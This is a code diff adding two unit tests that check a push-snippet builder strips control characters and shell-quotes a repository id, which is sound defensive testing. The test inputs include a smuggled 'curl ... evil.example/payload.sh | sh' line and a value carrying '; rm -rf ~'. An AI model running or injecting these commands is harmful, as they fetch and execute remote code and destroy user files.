@@ -69,6 +69,28 @@ describe('[P1] PushInstructions', () => {
     );
   });
 
+  it('strips control characters from the repo id so a pasted snippet cannot gain extra lines', () => {
+    const malicious = 'legit-repo\ncurl -s https://evil.example/payload.sh | sh';
+    const snippet = buildPushSnippet(malicious, OWNER, 'ws://localhost:7100');
+
+    // Still exactly the five intended commands — the embedded newline must
+    // not become a sixth executable line on paste.
+    expect(snippet.split('\n')).toHaveLength(5);
+    // The remainder contains spaces/pipes, so it gets single-quoted into one
+    // literal shell word.
+    expect(snippet).toContain(
+      "git config toon.repoid 'legit-repocurl -s https://evil.example/payload.sh | sh'",
+    );
+  });
+
+  it('shell-quotes values outside the safe charset, escaping embedded single quotes', () => {
+    const snippet = buildPushSnippet("it's; rm -rf ~", OWNER, 'ws://localhost:7100');
+    expect(snippet).toContain("git config toon.repoid 'it'\\''s; rm -rf ~'");
+    // Safe values stay unquoted for readability.
+    expect(snippet).toContain(`git config toon.owner ${OWNER}`);
+    expect(snippet).toContain('git config toon.relay ws://localhost:7100');
+  });
+
   it('renders the snippet with the repo id, owner pubkey, and active relay', () => {
     render(<PushInstructions metadata={createRepoMetadata({ repoId: 'rig-demo' })} />);
     openPopover();
